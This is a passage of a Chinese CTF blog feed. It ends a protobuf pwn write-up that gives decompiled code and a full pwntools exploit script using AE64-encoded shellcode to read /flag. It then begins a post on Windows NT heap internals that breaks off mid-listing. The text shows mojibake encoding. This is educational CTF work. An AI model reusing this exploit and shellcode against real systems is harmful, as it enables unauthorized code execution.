class="number">0x918D1C0CC7837D63</span>LL;</span><br><span class="line">  v7 = <span class="number">0xF877F9B36B6EF2D3</span>LL;</span><br><span class="line">  v8 = <span class="number">0x8EFDECFCE888E2BF</span>LL;</span><br><span class="line">  v9 = <span class="number">1090425597</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)v11);</span><br><span class="line">  sub_1417(v10, v11, v1);</span><br><span class="line">  sub_15EC(v10, a1, v4, v11);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(a1, s) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€çœ‹å°±æ˜¯ä¸€ä¸ªå¤æ‚çš„åŠ è§£å¯†è¿‡ç¨‹ï¼Œä¸è¿‡æˆ‘ç®€å•åˆ†æå¾—å‡ºgiaotokenåœ¨è¿™ä¸ªè§£å¯†ä¸­ï¼Œä¸ä¼šå› ä¸ºgiaotokençš„æ”¹å˜è€Œå‘ç”Ÿkeyçš„æ”¹å˜ï¼Œä¸”è§£å¯†åªæ˜¯ä¸€ä¸ªç®€å•çš„å¼‚æˆ–æ“ä½œï¼Œå› æ­¤å¯ä»¥æŠŠ<code>114514giaogiaogiao99</code>è¾“å…¥è¿›å»å°±èƒ½è·å¾—giaotoken</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505132037156.png" alt="image-20250513201404551" style="zoom:50%;" /><p>è¿›å…¥äº†æœ€ç»ˆåˆ†æ”¯ä¹‹åï¼Œå‘ç°å¯¹shellcodeçš„å­—èŠ‚æœ‰åšè¦æ±‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1908</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 - <span class="number">1</span> + a1) == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 - <span class="number">1</span> + a1) = <span class="number">0</span>;</span><br><span class="line">    v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)((<span class="type">int</span>)i + a1) &lt;= <span class="string">&#x27;\x1F&#x27;</span> || *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="string">&#x27;\x7F&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oops!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸èƒ½æ˜¯å°äº<code>\x1F</code>å’Œ<code>\x7F</code>ï¼Œé‚£ä¹ˆAE64ä¸€æŠŠæ¢­å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> giao_pb2</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./ez_orw&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line">ae64 = AE64()</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line">r64 =<span class="keyword">lambda</span>                         :u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#fmt(&#x27;%&#123;one_gadget &amp; 0xffff&#125;c&#x27;)</span></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;100.100.1.16&#x27;</span>,<span class="number">6498</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p = run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;giao?\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;replenish\n&#x27;</span>,<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">yes_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1fc7</span></span><br><span class="line">leak(<span class="string">&quot;yes_addr&quot;</span>,yes_addr)</span><br><span class="line">sl((<span class="built_in">hex</span>(yes_addr)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">giao=giao_pb2.devicemsg()</span><br><span class="line">giao.giaoid=<span class="number">1131796</span></span><br><span class="line">giao.giaosize=<span class="number">4281361</span></span><br><span class="line"><span class="comment"># giao.giaotoken=b&#x27;\x6A\x36\xAF\xA6\x7b\xA8\x5F\xB9\x63\x7D\x83\xC7\x0C\x1C\x8D\x91\xD3\xF2\x6E\x6B\xB3\xF9\x77\xF8\xBF\xE2\x88\xE8\xFC\xEC\xFD\x8E\xfd\x92\xFE\x40\x00&#x27;</span></span><br><span class="line">giao.giaotoken=<span class="string">b&#x27;87dd78e1-9025-4d57-9c2e-418608b3bbea&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.read(<span class="number">0</span>,<span class="string">&#x27;rax&#x27;</span>,<span class="number">0x400</span>))</span><br><span class="line">new_shellcode=ae64.encode(shellcode,<span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line"></span><br><span class="line">giao.giaocontent=new_shellcode</span><br><span class="line"><span class="comment"># debug(&quot;b *$rebase(0x0000000000001D67)&quot;)</span></span><br><span class="line">payload = giao.SerializeToString()</span><br><span class="line">sa(<span class="string">b&#x27;giao: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">orw_shell=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)+shellcraft.sendfile(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">48</span>))</span><br><span class="line">sl(<span class="number">0x100</span>*<span class="string">b&#x27;\x90&#x27;</span>+orw_shell)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤ï¼Œä¸è¿‡æ¯”èµ›çš„æ—¶å€™ï¼Œä¸çŸ¥é“ä¸ºä½•è¿œç¨‹ç¯å¢ƒæ²¡æ‰“é€šï¼Œä½†æ˜¯é€šè¿‡execveç›´æ¥getshellå°±é€šäº†ï¼Œè¿™ä¸ªæ²™ç›’çš„ç¬¬äºŒä¸ªprctlè¿”å›å€¼æ˜¾ç¤ºæ˜¯<code>0xffffffff</code>ï¼Œæ‰€ä»¥æ²™ç›’å¹¶æ²¡æœ‰å®Œå…¨å¼€èµ·æ¥ï¼Œè¿˜æ˜¯å¯ä»¥è¿›è¡Œgetshell</p><blockquote><p>æ€»çš„æ¥è¯´ï¼Œprotobuf pwnå°±æ˜¯å¤šäº†ä¸€ä¸ªé€†å‘ç»“æ„ä½“çš„è¿‡ç¨‹ï¼Œä¹Ÿå¤§å·®ä¸å·®äº†</p><p>æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„å°±æ˜¯åœ¨å‘é€protobuf packåçš„å­—èŠ‚åºåˆ—çš„æ—¶å€™ï¼Œåº”è¯¥é€šè¿‡sendæˆ–sendafterï¼Œè€Œä¸èƒ½ç”¨sendlineï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ª<code>\n</code>ä¼šå¯¼è‡´unpackçš„å¤±è´¥ï¼Œæœ‰ä¸€äº›å¸ˆå‚…åœ¨è¿™é‡Œä¼šå‡ºé—®é¢˜</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Protobuf (Protocol Buffers) æ˜¯è°·æ­Œå¼€å‘çš„ä¸€æ¬¾æ— å…³å¹³å°ï¼Œæ— å…³è¯­è¨€ï¼Œå¯æ‰©å±•ï¼Œè½»é‡çº§é«˜æ•ˆçš„åºåˆ—åŒ–ç»“æ„çš„æ•°æ®æ ¼å¼ï¼Œç”¨äº&lt;strong&gt;å°†è‡ªå®šä¹‰æ•°æ®ç»“æ„åºåˆ—åŒ–æˆå­—èŠ‚æµï¼Œå’Œå°†å­—èŠ‚æµååºåˆ—åŒ–ä¸ºæ•°æ®ç»“æ„&lt;/strong&gt;ã€‚æ‰€ä»¥å¾ˆé€‚åˆåšæ•°æ®å­˜å‚¨å’Œä¸ºä¸åŒè¯­è¨€ï¼Œä¸åŒåº”</summary>
      
    
    
    
    <category term="protobuf" scheme="http://s1nec-1o.github.io/categories/protobuf/"/>
    
    
    <category term="protobuf" scheme="http://s1nec-1o.github.io/tags/protobuf/"/>
    
  </entry>
  
  <entry>
    <title>windows heapåˆæ¢(2)</title>
    <link href="http://s1nec-1o.github.io/2025/05/10/windows-heap%E5%88%9D%E6%8E%A2-2/"/>
    <id>http://s1nec-1o.github.io/2025/05/10/windows-heap%E5%88%9D%E6%8E%A2-2/</id>
    <published>2025-05-10T07:18:42.000Z</published>
    <updated>2025-05-10T08:38:31.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windowså †åŸºç¡€çŸ¥è¯†"><a href="#windowså †åŸºç¡€çŸ¥è¯†" class="headerlink" title="windowså †åŸºç¡€çŸ¥è¯†"></a>windowså †åŸºç¡€çŸ¥è¯†</h2><p>win10çš„memory allocatoråŸºæœ¬ä¸Šåˆ†ä¸ºä¸¤ç§ï¼š</p><ol><li>Nt Heap<ul><li>é»˜è®¤çš„memory allocator<ul><li>åç«¯ç®¡ç†å™¨ï¼ˆBack-Endï¼‰</li><li>å‰ç«¯ç®¡ç†å™¨ï¼ˆFront-Endï¼‰</li></ul></li></ul></li><li>SegmentHeap<ul><li>Win10ä¸­å…¨æ–°çš„memory allocatoræœºåˆ¶</li></ul></li></ol><p>åœ¨LFHæœªå¯ç”¨æ—¶ï¼Œæˆ‘ä»¬call malloc</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519071.png" alt="image-20250508164639436"></p><p>å¯ç”¨LFHåï¼Œç¬¬ä¸€æ¬¡æˆ–LFHèƒ½ç”¨çš„ç©ºé—´éƒ½ç”¨å®Œæ—¶ï¼Œä¼šå…ˆè·ŸBack-Endè¦ä¸€å¤§å—ç©ºé—´æ¥ç®¡ç†</p><p>å¯ç”¨LFHä¹‹ååˆ†é…ç›¸åŒå¤§å°æ—¶ï¼Œä¼šç›´æ¥ç»™Front-Endç®¡ç†</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519072.png" alt="image-20250508164801386"></p><h3 id="Nt-Heap"><a href="#Nt-Heap" class="headerlink" title="Nt Heap"></a>Nt Heap</h3><h3 id="Back-End"><a href="#Back-End" class="headerlink" title="Back-End"></a>Back-End</h3><h4 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h4><h5 id="HEAP"><a href="#HEAP" class="headerlink" title="_HEAP"></a>_HEAP</h5><p><code>_HEAP</code>æ˜¯æ¯ä¸ªå †çš„æ ¸å¿ƒç»“æ„ï¼Œç”¨æ¥ç®¡ç†è¯¥<code>heap</code>ï¼Œæ¯ä¸ª<code>Heap</code>éƒ½æœ‰ä¸€ä¸ª<code>_HEAP</code>åœ¨<code>heap</code>å¼€å¤´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x2c0 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_SEGMENT</span> <span class="title">Segment</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Entry</span>;</span>                                       <span class="comment">//0x0</span></span><br><span class="line">            ULONG SegmentSignature;                                         <span class="comment">//0x10</span></span><br><span class="line">            ULONG SegmentFlags;                                             <span class="comment">//0x14</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentListEntry</span>;</span>                            <span class="comment">//0x18</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP</span>* <span class="title">Heap</span>;</span>                                             <span class="comment">//0x28</span></span><br><span class="line">            VOID* BaseAddress;                                              <span class="comment">//0x30</span></span><br><span class="line">            ULONG NumberOfPages;                                            <span class="comment">//0x38</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">FirstEntry</span>;</span>                                 <span class="comment">//0x40</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>* <span class="title">LastValidEntry</span>;</span>                             <span class="comment">//0x48</span></span><br><span class="line">            ULONG NumberOfUnCommittedPages;                                 <span class="comment">//0x50</span></span><br><span class="line">            ULONG NumberOfUnCommittedRanges;                                <span class="comment">//0x54</span></span><br><span class="line">            USHORT SegmentAllocatorBackTraceIndex;                          <span class="comment">//0x58</span></span><br><span class="line">            USHORT Reserved;                                                <span class="comment">//0x5a</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRSegmentList</span>;</span>                              <span class="comment">//0x60</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0x70</span></span><br><span class="line">    ULONG ForceFlags;                                                       <span class="comment">//0x74</span></span><br><span class="line">    ULONG CompatibilityFlags;                                               <span class="comment">//0x78</span></span><br><span class="line">    ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br><span class="line">    ULONG Interceptor;                                                      <span class="comment">//0x90</span></span><br><span class="line">    ULONG VirtualMemoryThreshold;                                           <span class="comment">//0x94</span></span><br><span class="line">    ULONG Signature;                                                        <span class="comment">//0x98</span></span><br><span class="line">    ULONGLONG SegmentReserve;                                               <span class="comment">//0xa0</span></span><br><span class="line">    ULONGLONG SegmentCommit;                                                <span class="comment">//0xa8</span></span><br><span class="line">    ULONGLONG DeCommitFreeBlockThreshold;                                   <span class="comment">//0xb0</span></span><br><span class="line">    ULONGLONG DeCommitTotalFreeThreshold;                                   <span class="comment">//0xb8</span></span><br><span class="line">    ULONGLONG TotalFreeSize;                                                <span class="comment">//0xc0</span></span><br><span class="line">    ULONGLONG MaximumAllocationSize;                                        <span class="comment">//0xc8</span></span><br><span class="line">    USHORT ProcessHeapsListIndex;                                           <span class="comment">//0xd0</span></span><br><span class="line">    USHORT HeaderValidateLength;                                            <span class="comment">//0xd2</span></span><br><span class="line">    VOID* HeaderValidateCopy;                                               <span class="comment">//0xd8</span></span><br><span class="line">    USHORT NextAvailableTagIndex;                                           <span class="comment">//0xe0</span></span><br><span class="line">    USHORT MaximumTagIndex;                                                 <span class="comment">//0xe2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TAG_ENTRY</span>* <span class="title">TagEntries</span>;</span>                                     <span class="comment">//0xe8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">UCRList</span>;</span>                                             <span class="comment">//0xf0</span></span><br><span class="line">    ULONGLONG AlignRound;                                                   <span class="comment">//0x100</span></span><br><span class="line">    ULONGLONG AlignMask;                                                    <span class="comment">//0x108</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">VirtualAllocdBlocks</span>;</span>                                 <span class="comment">//0x110</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">SegmentList</span>;</span>                                         <span class="comment">//0x120</span></span><br><span class="line">    USHORT AllocatorBackTraceIndex;                                         <span class="comment">//0x130</span></span><br><span class="line">    ULONG NonDedicatedListLength;                                           <span class="comment">//0x134</span></span><br><span class="line">    VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line">    VOID* UCRIndex;                                                         <span class="comment">//0x140</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_PSEUDO_TAG_ENTRY</span>* <span class="title">PseudoTagEntries</span>;</span>                        <span class="comment">//0x148</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LOCK</span>* <span class="title">LockVariable</span>;</span>                                        <span class="comment">//0x160</span></span><br><span class="line">    LONG (*CommitRoutine)(VOID* arg1, VOID** arg2, ULONGLONG* arg3);        <span class="comment">//0x168</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">RTL_RUN_ONCE</span> <span class="title">StackTraceInitVar</span>;</span>                                  <span class="comment">//0x170</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_HEAP_MEMORY_LIMIT_DATA</span> <span class="title">CommitLimitData</span>;</span>                     <span class="comment">//0x178</span></span><br><span class="line">    VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">    USHORT FrontHeapLockCount;                                              <span class="comment">//0x1a0</span></span><br><span class="line">    UCHAR FrontEndHeapType;                                                 <span class="comment">//0x1a2</span></span><br><span class="line">    UCHAR RequestedFrontEndHeapType;                                        <span class="comment">//0x1a3</span></span><br><span class="line">    WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br><span class="line">    USHORT FrontEndHeapMaximumIndex;                                        <span class="comment">//0x1b0</span></span><br><span class="line">    <span class="keyword">volatile</span> UCHAR FrontEndHeapStatusBitmap[<span class="number">129</span>];                           <span class="comment">//0x1b2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_COUNTERS</span> <span class="title">Counters</span>;</span>                                         <span class="comment">//0x238</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_TUNING_PARAMETERS</span> <span class="title">TuningParameters</span>;</span>                        <span class="comment">//0x2b0</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>å…¶ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ULONG EncodeFlagMask;                                                   <span class="comment">//0x7c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">Encoding</span>;</span>                                            <span class="comment">//0x80</span></span><br></pre></td></tr></table></figure><p><code>EncodeFlagMask</code>æ˜¯ç”¨æ¥åˆ¤æ–­æ˜¯å¦è¦encodeè¯¥heapä¸­chunkçš„header</p><p><code>Encoding</code>ç”¨æ¥ä¸chunk headeråšxorçš„<code>cookie</code></p><blockquote><p>æ‰€æœ‰çš„chunkéƒ½ä¼šç»è¿‡xorï¼Œåœ¨å­˜å…¥chunk headeræ—¶ï¼Œä¼šå°†æ•´ä¸ª<code>header^(_HEAP-&gt;Encoding)</code>å†å­˜å…¥</p><p>decodeæ—¶ä¼šéªŒè¯ï¼Œç¡®ä¿æ²¡è¢«æ”¹æ‰ï¼ŒéªŒè¯æ–¹å¼ä¸ºï¼šå…ˆå¼‚æˆ–å›åŸæ¥çš„å€¼ï¼Œç„¶åå‰ä¸‰ä¸ªbyteå¼‚æˆ–åå’Œç¬¬å››ä¸ªbyteæ¯”å¯¹</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VOID* BlocksIndex;                                                      <span class="comment">//0x138</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FreeLists</span>;</span>                                           <span class="comment">//0x150</span></span><br></pre></td></tr></table></figure><p><code>BlocksIndex</code>æ˜¯Back-Endçš„é‡è¦ç»“æ„ï¼Œä¹‹åä¼šè¯¦ç»†è®²è§£</p><p><code>FreeList</code>ä¸²æ¥Back-Endä¸­çš„æ‰€æœ‰free chunkï¼Œç±»ä¼¼unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VOID* FrontEndHeap;                                                     <span class="comment">//0x198</span></span><br><span class="line">WCHAR* FrontEndHeapUsageData;                                           <span class="comment">//0x1a8</span></span><br></pre></td></tr></table></figure><p><code>FrontEndHeap</code>æŒ‡å‘ç®¡ç†Front-Endçš„Heapçš„ç»“æ„</p><p><code>FrontEndHeapUsageData</code>æŒ‡å‘ä¸€ä¸ªå¯¹åº”å„å¤§å°çš„chunkçš„é˜µåˆ—ï¼Œè®°å½•å„ç§å¤§å°chunkä½¿ç”¨æ¬¡æ•°ï¼Œåˆ°è¾¾æŸç§ç¨‹åº¦æ—¶ä¼šé‡‡ç”¨Front-End allocater</p><h5 id="HEAP-ENTRY-chunk"><a href="#HEAP-ENTRY-chunk" class="headerlink" title="_HEAP_ENTRY(chunk)"></a>_HEAP_ENTRY(chunk)</h5><p>_HEAP_ENTRY(chunk)</p><ul><li>åˆ†ä¸ºä¸‰ç§æƒ…å†µ<ul><li>Allocated chunk</li><li>Freed chunk</li><li>VirtualAlloc chunk</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 